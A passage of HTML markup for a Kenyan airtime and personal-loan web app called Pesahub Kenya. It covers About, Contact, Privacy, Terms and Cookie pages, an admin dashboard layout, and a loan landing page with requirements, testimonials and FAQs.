                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Deposit and manage your wallet easily</li>
                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Send airtime to any network</li>
                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Access quick personal loans with flexible repayment terms</li>
                        <li><i class="fas fa-check" style="color: var(--success); margin-right: 8px;"></i>Get emergency funds when you need them most</li>
                    </ul>

                    <!-- Loan Services Section -->
                    <div style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.1), rgba(39, 174, 96, 0.1)); padding: 20px; border-radius: 12px; margin-bottom: 20px; border: 1px solid rgba(46, 204, 113, 0.3);">
                        <h4 style="color: #27ae60; margin-bottom: 15px;"><i class="fas fa-hand-holding-usd" style="margin-right: 8px;"></i>Our Loan Services</h4>
                        <p style="color: var(--gray); margin-bottom: 10px;">Beyond airtime services, we also offer quick and convenient personal loans to help you meet your financial needs:</p>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Fast loan approval and disbursement</li>
                            <li>Competitive interest rates</li>
                            <li>Flexible repayment periods</li>
                            <li>No hidden charges or fees</li>
                            <li>Loans sent directly to your M-Pesa</li>
                        </ul>
                    </div>
                    
                    <div style="text-align: center; margin-bottom: 15px;">
                        <img src="about2.png" alt="Our Team" style="max-width: 100%; border-radius: 16px;" onerror="this.style.display='none'">
                    </div>
                    
                    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 20px;">
                        <div style="text-align: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-calendar-alt" style="font-size: 1.5rem; color: var(--primary); margin-bottom: 8px;"></i>
                            <p style="font-weight: 600;">Founded</p>
                            <p style="color: var(--gray);">2025</p>
                        </div>
                        <div style="text-align: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-map-marker-alt" style="font-size: 1.5rem; color: var(--primary); margin-bottom: 8px;"></i>
                            <p style="font-weight: 600;">Location</p>
                            <p style="color: var(--gray);">Nairobi, Kenya</p>
                        </div>
                    </div>
                </div>
            </div>

            <div id="page-contact" class="page">
                <div class="card">
                    <button class="btn btn-outline" onclick="history.back()" style="margin-bottom: 15px; width: auto; padding: 10px 20px;">
                        <i class="fas fa-arrow-left"></i> Back
                    </button>
                    <h3 class="card-title"><i class="fas fa-envelope"></i> <span data-translate="contactUs">Contact Us</span></h3>
                    
                    <p style="margin-bottom: 20px; font-size: 1.05rem;">Have questions about airtime, loans, or need help? We're here for you 24/7!</p>
                    
                    <div style="display: grid; gap: 15px; margin-bottom: 25px;">
                        <div style="display: flex; align-items: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fab fa-whatsapp" style="font-size: 2rem; color: #25d366; margin-right: 15px;"></i>
                            <div>
                                <p style="font-weight: 600; margin-bottom: 3px;">WhatsApp</p>
                                <a href="https://wa.me/254732202740" target="_blank" style="color: var(--primary);">+254 732202740</a>
                            </div>
                        </div>
                        
                        <div style="display: flex; align-items: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-phone-alt" style="font-size: 2rem; color: var(--primary); margin-right: 15px;"></i>
                            <div>
                                <p style="font-weight: 600; margin-bottom: 3px;">Phone Call</p>
                                <a href="tel:+254732202740" style="color: var(--primary);">+254 732202740</a>
                            </div>
                        </div>
                        
                        <div style="display: flex; align-items: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-envelope" style="font-size: 2rem; color: var(--info); margin-right: 15px;"></i>
                            <div>
                                <p style="font-weight: 600; margin-bottom: 3px;">Email</p>
                                <a href="mailto:support@airtimesolutionkenya.com" style="color: var(--primary);">support@airtimesolutionkenya.com</a>
                            </div>
                        </div>
                        
                        <div style="display: flex; align-items: center; padding: 15px; background: var(--light); border-radius: 12px;">
                            <i class="fas fa-clock" style="font-size: 2rem; color: var(--secondary); margin-right: 15px;"></i>
                            <div>
                                <p style="font-weight: 600; margin-bottom: 3px;">Working Hours</p>
                                <p style="color: var(--gray);">24 Hours, 7 Days a Week</p>
                            </div>
                        </div>
                    </div>

                    <!-- Services We Support -->
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 20px;">
                        <h4 style="color: var(--primary); margin-bottom: 15px;"><i class="fas fa-concierge-bell" style="margin-right: 8px;"></i>We Can Help You With</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Airtime purchases and transactions</li>
                            <li>Wallet deposits and withdrawals</li>
                            <li>Loan applications and inquiries</li>
                            <li>Loan repayment support</li>
                            <li>Account issues and verification</li>
                            <li>Technical support</li>
                        </ul>
                    </div>
                    
                    <div style="background: linear-gradient(135deg, var(--primary), var(--primary-dark)); padding: 20px; border-radius: 12px; text-align: center; color: white; margin-bottom: 15px;">
                        <h4 style="margin-bottom: 10px;"><i class="fas fa-headset" style="margin-right: 8px;"></i>Need Immediate Help?</h4>
                        <p style="opacity: 0.9; margin-bottom: 15px;">Our support team is always ready to assist you with airtime, loans, or any other questions.</p>
                        <a href="https://wa.me/254732202740" target="_blank" class="btn btn-secondary" style="display: inline-flex; width: auto;">
                            <i class="fab fa-whatsapp"></i> Chat Now on WhatsApp
                        </a>
                    </div>
                </div>
            </div>

            <div id="page-privacy" class="page">
                <div class="card">
                    <button class="btn btn-outline" onclick="history.back()" style="margin-bottom: 15px; width: auto; padding: 10px 20px;">
                        <i class="fas fa-arrow-left"></i> Back
                    </button>
                    <h3 class="card-title"><i class="fas fa-shield-alt"></i> <span data-translate="privacyPolicy">Privacy Policy</span></h3>
                    
                    <div style="text-align: center; margin-bottom: 20px;">
                        <img src="privacy1.png" alt="Privacy" style="max-width: 150px; border-radius: 12px;" onerror="this.style.display='none'">
                    </div>
                    
                    <div style="background: var(--light); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
                        <p style="color: var(--gray);"><i class="fas fa-calendar" style="margin-right: 8px;"></i><strong>Last Updated:</strong> December 2025</p>
                    </div>
                    
                    <p style="margin-bottom: 20px;">At Pesahub Kenya, we are committed to protecting your privacy and ensuring the security of your personal information for both our airtime and loan services.</p>
                    
                    <div style="border-left: 4px solid var(--primary); padding-left: 15px; margin-bottom: 20px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;">1. Information We Collect</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Email address for account authentication</li>
                            <li>Phone number for airtime transactions and loan disbursements</li>
                            <li>Transaction history and amounts</li>
                            <li>Device information for security purposes</li>
                            <li>National ID for loan eligibility verification</li>
                            <li>Emergency contact details for loan applications</li>
                            <li>Employment and income information for loan assessment</li>
                        </ul>
                    </div>
                    
                    <div style="border-left: 4px solid var(--info); padding-left: 15px; margin-bottom: 20px;">
                        <h4 style="color: var(--info); margin-bottom: 10px;">2. How We Use Your Information</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Process airtime purchases and deposits</li>
                            <li>Process and disburse loan applications</li>
                            <li>Assess loan eligibility and creditworthiness</li>
                            <li>Send transaction and loan repayment confirmations</li>
                            <li>Provide customer support for all services</li>
                            <li>Improve our services and user experience</li>
                            <li>Prevent fraud and maintain security</li>
                            <li>Send loan repayment reminders</li>
                        </ul>
                    </div>
                    
                    <div style="border-left: 4px solid var(--success); padding-left: 15px; margin-bottom: 20px;">
                        <h4 style="color: var(--success); margin-bottom: 10px;">3. Data Security</h4>
                        <p style="color: var(--gray); margin-bottom: 10px;">We implement industry-standard security measures including:</p>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>SSL/TLS encryption for all data transfers</li>
                            <li>Secure payment processing via M-Pesa</li>
                            <li>Encrypted storage of sensitive loan application data</li>
                            <li>Regular security audits</li>
                            <li>Access controls and authentication</li>
                        </ul>
                    </div>

                    <div style="border-left: 4px solid #27ae60; padding-left: 15px; margin-bottom: 20px;">
                        <h4 style="color: #27ae60; margin-bottom: 10px;">4. Loan Data Protection</h4>
                        <p style="color: var(--gray); margin-bottom: 10px;">For loan services, we take extra precautions:</p>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Your loan information is kept strictly confidential</li>
                            <li>Emergency contacts are only used for loan recovery purposes</li>
                            <li>We do not share your financial data with unauthorized third parties</li>
                            <li>Loan history is securely stored and protected</li>
                        </ul>
                    </div>
                    
                    <div style="border-left: 4px solid var(--warning); padding-left: 15px; margin-bottom: 20px;">
                        <h4 style="color: var(--warning); margin-bottom: 10px;">5. Your Rights</h4>
                        <p style="color: var(--gray);">You have the right to access, correct, or delete your personal data. Contact us at support@airtimesolutionkenya.com for any privacy-related requests regarding airtime or loan services.</p>
                    </div>
                    
                    <div style="text-align: center;">
                        <img src="privacy2.png" alt="Data Protection" style="max-width: 100%; border-radius: 12px;" onerror="this.style.display='none'">
                    </div>
                </div>
            </div>

            <div id="page-terms" class="page">
                <div class="card">
                    <button class="btn btn-outline" onclick="history.back()" style="margin-bottom: 15px; width: auto; padding: 10px 20px;">
                        <i class="fas fa-arrow-left"></i> Back
                    </button>
                    <h3 class="card-title"><i class="fas fa-file-contract"></i> <span data-translate="termsOfService">Terms of Service</span></h3>
                    
                    <div style="background: var(--light); padding: 15px; border-radius: 12px; margin-bottom: 20px;">
                        <p style="color: var(--gray);"><i class="fas fa-calendar" style="margin-right: 8px;"></i><strong>Effective Date:</strong> December 2025</p>
                    </div>
                    
                    <p style="margin-bottom: 20px;">Please read these Terms of Service carefully before using Pesahub Kenya's airtime and loan services.</p>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-handshake" style="margin-right: 8px;"></i>1. Acceptance of Terms</h4>
                        <p style="color: var(--gray);">By accessing or using Pesahub Kenya, you agree to be bound by these Terms of Service for all our services including airtime transactions and loan facilities. If you do not agree, please do not use our services.</p>
                    </div>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-cogs" style="margin-right: 8px;"></i>2. Services Provided</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Airtime purchase for Safaricom, Airtel, and Telkom networks</li>
                            <li>Wallet deposit and management</li>
                            <li>Airtime to cash conversion (coming soon)</li>
                            <li>Personal loan facilities with flexible terms</li>
                            <li>Quick loan disbursement via M-Pesa</li>
                            <li>All completed transactions are final and non-reversible</li>
                        </ul>
                    </div>

                    <div style="background: linear-gradient(135deg, rgba(46, 204, 113, 0.1), rgba(39, 174, 96, 0.1)); padding: 20px; border-radius: 12px; margin-bottom: 15px; border: 1px solid rgba(46, 204, 113, 0.3);">
                        <h4 style="color: #27ae60; margin-bottom: 10px;"><i class="fas fa-hand-holding-usd" style="margin-right: 8px;"></i>3. Loan Terms and Conditions</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Loans are subject to eligibility verification and approval</li>
                            <li>Interest rates and repayment terms are disclosed before disbursement</li>
                            <li>You must repay loans within the agreed timeframe</li>
                            <li>Late payments may incur additional fees as specified</li>
                            <li>Defaulting on loans may affect your future eligibility</li>
                            <li>Emergency contacts may be contacted for loan recovery purposes</li>
                            <li>Loan disbursements are made via M-Pesa to your registered number</li>
                        </ul>
                    </div>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-user-shield" style="margin-right: 8px;"></i>4. User Responsibilities</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Maintain the security of your account credentials</li>
                            <li>Provide accurate phone numbers for transactions</li>
                            <li>Provide truthful information for loan applications</li>
                            <li>Repay loans within the agreed timeframe</li>
                            <li>Report any unauthorized activity immediately</li>
                            <li>Use services only for lawful purposes</li>
                        </ul>
                    </div>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-ban" style="margin-right: 8px;"></i>5. Prohibited Activities</h4>
                        <ul style="margin-left: 15px; color: var(--gray); line-height: 1.8;">
                            <li>Fraudulent transactions or money laundering</li>
                            <li>Providing false information for loan applications</li>
                            <li>Attempting to exploit system vulnerabilities</li>
                            <li>Using the service for illegal purposes</li>
                            <li>Sharing account credentials with others</li>
                            <li>Taking loans with no intention to repay</li>
                        </ul>
                    </div>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-gavel" style="margin-right: 8px;"></i>6. Limitation of Liability</h4>
                        <p style="color: var(--gray);">Pesahub Kenya shall not be liable for any indirect, incidental, or consequential damages arising from the use of our airtime or loan services. Our maximum liability is limited to the amount of the transaction in question.</p>
                    </div>
                </div>
            </div>

            <div id="page-cookies" class="page">
                <div class="card">
                    <h3 class="card-title"><i class="fas fa-cookie-bite"></i> Cookie Policy</h3>
                    
                    <p style="margin-bottom: 20px;">We use cookies to enhance your experience on Pesahub Kenya. This policy explains what cookies are and how we use them.</p>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-question-circle" style="margin-right: 8px;"></i>What Are Cookies?</h4>
                        <p style="color: var(--gray);">Cookies are small text files stored on your device when you visit a website. They help us remember your preferences and improve your experience.</p>
                    </div>
                    
                    <div style="background: var(--light); padding: 20px; border-radius: 12px; margin-bottom: 15px;">
                        <h4 style="color: var(--primary); margin-bottom: 10px;"><i class="fas fa-list" style="margin-right: 8px;"></i>Types of Cookies We Use</h4>
                        <div style="margin-top: 15px;">
                            <div style="display: flex; align-items: start; margin-bottom: 15px;">
                                <i class="fas fa-check-circle" style="color: var(--success); margin-right: 10px; margin-top: 3px;"></i>
                                <div>
                                    <p style="font-weight: 600;">Essential Cookies</p>
                                    <p style="color: var(--gray); font-size: 0.9rem;">Required for basic functionality like authentication and security.</p>
                                </div>
                            </div>
                            <div style="display: flex; align-items: start; margin-bottom: 15px;">
                                <i class="fas fa-chart-bar" style="color: var(--info); margin-right: 10px; margin-top: 3px;"></i>
                                <div>
                                    <p style="font-weight: 600;">Analytics Cookies</p>
                                    <p style="color: var(--gray); font-size: 0.9rem;">Help us understand how users interact with our platform.</p>
                                </div>
                            </div>
                            <div style="display: flex; align-items: start;">
                                <i class="fas fa-sliders-h" style="color: var(--secondary); margin-right: 10px; margin-top: 3px;"></i>
                                <div>
                                    <p style="font-weight: 600;">Preference Cookies</p>
                                    <p style="color: var(--gray); font-size: 0.9rem;">Remember your settings like language and theme preferences.</p>
                                </div>
                            </div>
                        </div>
                    </div>
                    
                    <div style="background: linear-gradient(135deg, var(--primary), var(--primary-dark)); padding: 20px; border-radius: 12px; color: white; text-align: center;">
                        <h4 style="margin-bottom: 15px;"><i class="fas fa-cookie" style="margin-right: 8px;"></i>Your Cookie Preferences</h4>
                        <p style="opacity: 0.9; margin-bottom: 15px;">Choose which cookies you want to accept:</p>
                        <div style="display: flex; gap: 10px; justify-content: center;">
                            <button class="btn btn-secondary" style="flex: 1; max-width: 150px;" onclick="acceptCookies()">Accept All</button>
                            <button class="btn" style="flex: 1; max-width: 150px; background: rgba(255,255,255,0.2); color: white;" onclick="rejectCookies()">Essential Only</button>
                        </div>
                    </div>
                </div>
            </div>

            <div id="page-admin" class="page">
                <div id="adminLogin" class="card" style="max-width: 400px; margin: 0 auto;">
                    <h3 class="card-title"><i class="fas fa-user-shield"></i> Admin Login</h3>
                    <form id="adminLoginForm">
                        <div class="form-group">
                            <label class="form-label"><i class="fas fa-lock"></i> Enter your merchant password</label>
                            <input type="password" class="form-input" id="adminPassword" placeholder="Enter admin password" required>
                        </div>
                        <button type="submit" class="btn btn-primary" id="adminLoginBtn">
                            <i class="fas fa-sign-in-alt"></i> Login
                        </button>
                    </form>
                </div>

                <div id="adminDashboard" style="display: none;">
                    <div class="stats-grid">
                        <div class="stat-card">
                            <i class="fas fa-users"></i>
                            <div class="value" id="statTotalUsers">0</div>
                            <div class="label">Total Users</div>
                        </div>
                        <div class="stat-card">
                            <i class="fas fa-wallet"></i>
                            <div class="value" id="statTotalDeposits">0</div>
                            <div class="label">Total Deposits</div>
                        </div>
                        <div class="stat-card">
                            <i class="fas fa-mobile-alt"></i>
                            <div class="value" id="statTotalAirtime">0</div>
                            <div class="label">Total Airtime</div>
                        </div>
                        <div class="stat-card">
                            <i class="fas fa-clock"></i>
                            <div class="value" id="statPendingVerifications">0</div>
                            <div class="label">Pending</div>
                        </div>
                    </div>

                    <div class="admin-tabs">
                        <button class="admin-tab active" onclick="showAdminTab('users')">Users</button>
                        <button class="admin-tab" onclick="showAdminTab('transactions')">Transactions</button>
                        <button class="admin-tab" onclick="showAdminTab('verifications')">Verifications</button>
                        <button class="admin-tab" onclick="showAdminTab('notifications')">Send Notification</button>
                        <button class="admin-tab" onclick="showAdminTab('settings')">Settings</button>
                    </div>

                    <div class="card" id="adminTabUsers">
                        <h3 class="card-title">All Users</h3>
                        <div class="table-responsive">
                            <table class="data-table" id="usersTable">
                                <thead>
                                    <tr>
                                        <th>Email</th>
                                        <th>Balance</th>
                                        <th>Bonus</th>
                                        <th>Status</th>
                                        <th>Created</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>
                    </div>

                    <div class="card" id="adminTabTransactions" style="display: none;">
                        <h3 class="card-title">All Transactions</h3>
                        <div class="table-responsive">
                            <table class="data-table" id="adminTxTable">
                                <thead>
                                    <tr>
                                        <th>User</th>
                                        <th>Type</th>
                                        <th>Amount</th>
                                        <th>Phone</th>
                                        <th>Status</th>
                                        <th>Date</th>
                                    </tr>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>
                    </div>

                    <div class="card" id="adminTabVerifications" style="display: none;">
                        <h3 class="card-title">Deposit Verifications</h3>
                        <div class="table-responsive">
                            <table class="data-table" id="verificationsTable">
                                <thead>
                                    <tr>
                                        <th>User</th>
                                        <th>M-Pesa Code</th>
                                        <th>Amount</th>
                                        <th>Status</th>
                                        <th>Actions</th>
                                    </tr>
                                </thead>
                                <tbody></tbody>
                            </table>
                        </div>
                    </div>

                    <div class="card" id="adminTabNotifications" style="display: none;">
                        <h3 class="card-title">Send Notification</h3>
                        <form id="adminNotificationForm">
                            <div class="form-group">
                                <label class="form-label">Recipient</label>
                                <select class="form-input" id="notifRecipient">
                                    <option value="">All Users</option>
                                </select>
                            </div>
                            <div class="form-group">
                                <label class="form-label">Title</label>
                                <input type="text" class="form-input" id="notifTitle" placeholder="Notification title" required>
                            </div>
                            <div class="form-group">
                                <label class="form-label">Message</label>
                                <textarea class="form-input" id="notifMessage" rows="4" placeholder="Enter your message" required></textarea>
                            </div>
                            <button type="submit" class="btn btn-primary">
                                <i class="fas fa-paper-plane"></i> Send Notification
                            </button>
                        </form>
                    </div>

                    <div class="card" id="adminTabSettings" style="display: none;">
                        <h3 class="card-title">System Settings</h3>
                        <div class="form-group">
                            <label class="form-label">Float Status</label>
                            <select class="form-input" id="floatStatusSelect" onchange="updateFloatStatus(this.value)">
                                <option value="false">Available</option>
                                <option value="true">Low / Unavailable</option>
                            </select>
                        </div>
                        <div class="form-group" style="margin-top: 20px;">
                            <label class="form-label">Deposit Status</label>
                            <select class="form-input" id="depositStatusSelect" onchange="updateDepositStatus(this.value)">
                                <option value="false">Enabled</option>
                                <option value="true">Disabled</option>
                            </select>
                            <p style="font-size: 0.85rem; color: var(--gray); margin-top: 5px;">When disabled, users cannot make new deposits.</p>
                        </div>
                    </div>

                    <button class="btn btn-outline" style="margin-top: 20px;" onclick="logoutAdmin()">
                        <i class="fas fa-sign-out-alt"></i> Logout Admin
                    </button>
                </div>
            </div>

            <!-- Loan Dashboard Page -->
            <div id="page-loan-dashboard" class="page">
                <div class="loan-hero-section" style="background: url('loan-hero-bg.png') center center / cover no-repeat; border-radius: 0; padding: 40px 20px; margin: 0 0 20px 0; position: relative; min-height: 250px;">
                    <div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(135deg, rgba(39, 174, 96, 0.9), rgba(46, 204, 113, 0.8)); z-index: 0;"></div>
                    <div style="position: relative; z-index: 1; text-align: center; color: white;">
                        <i class="fas fa-hand-holding-usd" style="font-size: 3rem; margin-bottom: 15px;"></i>
                        <h1 style="font-size: 1.8rem; margin-bottom: 10px;">Get Instant Loans up to KES 15,000</h1>
                        <p style="opacity: 0.9; margin-bottom: 20px;">Fast approval, flexible repayment. Apply now!</p>
                        <button class="btn btn-secondary" onclick="checkLoanApplicationStatus()" style="display: inline-flex; width: auto; padding: 15px 40px; font-size: 1.1rem;">
                            <i class="fas fa-rocket"></i> Apply for a Loan Today
                        </button>
                    </div>
                </div>

                <div class="page-content">
                    <!-- Factors and Requirements -->
                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-clipboard-list"></i> Factors & Requirements</h3>
                        <div style="display: grid; gap: 15px;">
                            <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-id-card" style="font-size: 1.5rem; color: var(--primary);"></i>
                                <div>
                                    <h4 style="font-size: 0.95rem; margin-bottom: 3px;">Valid Kenyan ID</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Must be 18 years or older</p>
                                </div>
                            </div>
                            <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-phone-alt" style="font-size: 1.5rem; color: var(--success);"></i>
                                <div>
                                    <h4 style="font-size: 0.95rem; margin-bottom: 3px;">Active M-Pesa Account</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Safaricom line required for disbursement</p>
                                </div>
                            </div>
                            <div style="display: flex; align-items: center; gap: 15px; padding: 15px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-briefcase" style="font-size: 1.5rem; color: var(--info);"></i>
                                <div>
                                    <h4 style="font-size: 0.95rem; margin-bottom: 3px;">Proof of Income</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Employed, self-employed, or business owner</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- How It Works -->
                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-cogs"></i> How It Works</h3>
                        <div style="display: grid; gap: 20px;">
                            <div style="display: flex; gap: 15px; align-items: flex-start;">
                                <div style="width: 40px; height: 40px; background: linear-gradient(135deg, var(--primary), var(--primary-light)); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; flex-shrink: 0;">1</div>
                                <div>
                                    <h4 style="font-size: 1rem; margin-bottom: 5px;">Fill Application Form</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Complete your personal and financial details in our simple eligibility form</p>
                                </div>
                            </div>
                            <div style="display: flex; gap: 15px; align-items: flex-start;">
                                <div style="width: 40px; height: 40px; background: linear-gradient(135deg, var(--primary), var(--primary-light)); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; flex-shrink: 0;">2</div>
                                <div>
                                    <h4 style="font-size: 1rem; margin-bottom: 5px;">Quick Verification</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Our system verifies your information with partner lenders instantly</p>
                                </div>
                            </div>
                            <div style="display: flex; gap: 15px; align-items: flex-start;">
                                <div style="width: 40px; height: 40px; background: linear-gradient(135deg, var(--primary), var(--primary-light)); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; flex-shrink: 0;">3</div>
                                <div>
                                    <h4 style="font-size: 1rem; margin-bottom: 5px;">Choose Your Offer</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Select from multiple loan offers from our trusted partners</p>
                                </div>
                            </div>
                            <div style="display: flex; gap: 15px; align-items: flex-start;">
                                <div style="width: 40px; height: 40px; background: linear-gradient(135deg, var(--success), #2ecc71)); color: white; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 700; flex-shrink: 0;">4</div>
                                <div>
                                    <h4 style="font-size: 1rem; margin-bottom: 5px;">Receive Funds</h4>
                                    <p style="font-size: 0.85rem; color: var(--gray);">Get your money directly to your M-Pesa within minutes!</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Why Choose Us -->
                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-star"></i> Why Choose Us</h3>
                        <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px;">
                            <div style="text-align: center; padding: 20px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-bolt" style="font-size: 2rem; color: var(--secondary); margin-bottom: 10px;"></i>
                                <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Fast Approval</h4>
                                <p style="font-size: 0.8rem; color: var(--gray);">Get approved in minutes</p>
                            </div>
                            <div style="text-align: center; padding: 20px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-percent" style="font-size: 2rem; color: var(--success); margin-bottom: 10px;"></i>
                                <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Low Interest</h4>
                                <p style="font-size: 0.8rem; color: var(--gray);">Competitive rates from 1.5%</p>
                            </div>
                            <div style="text-align: center; padding: 20px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-calendar-alt" style="font-size: 2rem; color: var(--info); margin-bottom: 10px;"></i>
                                <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Flexible Terms</h4>
                                <p style="font-size: 0.8rem; color: var(--gray);">60-100 days repayment</p>
                            </div>
                            <div style="text-align: center; padding: 20px; background: var(--light); border-radius: 12px;">
                                <i class="fas fa-shield-alt" style="font-size: 2rem; color: var(--primary); margin-bottom: 10px;"></i>
                                <h4 style="font-size: 0.9rem; margin-bottom: 5px;">Secure & Safe</h4>
                                <p style="font-size: 0.8rem; color: var(--gray);">Data encryption</p>
                            </div>
                        </div>
                    </div>

                    <!-- Testimonials -->
                    <div class="card" style="margin-bottom: 20px; overflow: hidden;">
                        <h3 class="card-title"><i class="fas fa-comments"></i> Customer Testimonials</h3>
                        <div id="testimonialSlider" style="overflow: hidden;">
                            <div id="testimonialTrack" style="display: flex; transition: transform 0.5s ease; animation: scrollTestimonials 15s linear infinite;">
                                <div style="min-width: 100%; padding: 20px; background: var(--light); border-radius: 12px; margin-right: 15px;">
                                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                                        <div style="width: 50px; height: 50px; background: var(--primary); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600;">JM</div>
                                        <div>
                                            <h4 style="font-size: 0.95rem;">John M.</h4>
                                            <div style="color: var(--secondary);"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                                        </div>
                                    </div>
                                    <p style="font-size: 0.9rem; color: var(--gray); font-style: italic;">"I got my loan in just 5 minutes! The process was so easy and the interest rate was fair. Highly recommended!"</p>
                                </div>
                                <div style="min-width: 100%; padding: 20px; background: var(--light); border-radius: 12px; margin-right: 15px;">
                                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                                        <div style="width: 50px; height: 50px; background: var(--success); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600;">MW</div>
                                        <div>
                                            <h4 style="font-size: 0.95rem;">Mary W.</h4>
                                            <div style="color: var(--secondary);"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star-half-alt"></i></div>
                                        </div>
                                    </div>
                                    <p style="font-size: 0.9rem; color: var(--gray); font-style: italic;">"Best loan service I've used. No hidden charges and the support team is always helpful!"</p>
                                </div>
                                <div style="min-width: 100%; padding: 20px; background: var(--light); border-radius: 12px;">
                                    <div style="display: flex; align-items: center; gap: 10px; margin-bottom: 10px;">
                                        <div style="width: 50px; height: 50px; background: var(--info); border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: 600;">PK</div>
                                        <div>
                                            <h4 style="font-size: 0.95rem;">Peter K.</h4>
                                            <div style="color: var(--secondary);"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
                                        </div>
                                    </div>
                                    <p style="font-size: 0.9rem; color: var(--gray); font-style: italic;">"Emergency came up and needed cash fast. This service saved me! Money was in my M-Pesa in minutes."</p>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- FAQ -->
                    <div class="card" style="margin-bottom: 20px;">
                        <h3 class="card-title"><i class="fas fa-question-circle"></i> Frequently Asked Questions</h3>
                        <div style="display: grid; gap: 15px;">
                            <div style="background: var(--light); padding: 15px; border-radius: 12px; cursor: pointer;" onclick="this.classList.toggle('expanded')">
                                <div style="display: flex; justify-content: space-between; align-items: center;">
                                    <h4 style="font-size: 0.95rem;">How long does approval take?</h4>
                                    <i class="fas fa-chevron-down" style="color: var(--gray);"></i>
                                </div>
                                <p style="font-size: 0.85rem; color: var(--gray); margin-top: 10px;">Approval typically takes 2-5 minutes after submitting your application.</p>
                            </div>
                            <div style="background: var(--light); padding: 15px; border-radius: 12px; cursor: pointer;" onclick="this.classList.toggle('expanded')">
                                <div style="display: flex; justify-content: space-between; align-items: center;">
                                    <h4 style="font-size: 0.95rem;">What is the maximum loan amount?</h4>
                                    <i class="fas fa-chevron-down" style="color: var(--gray);"></i>
                                </div>
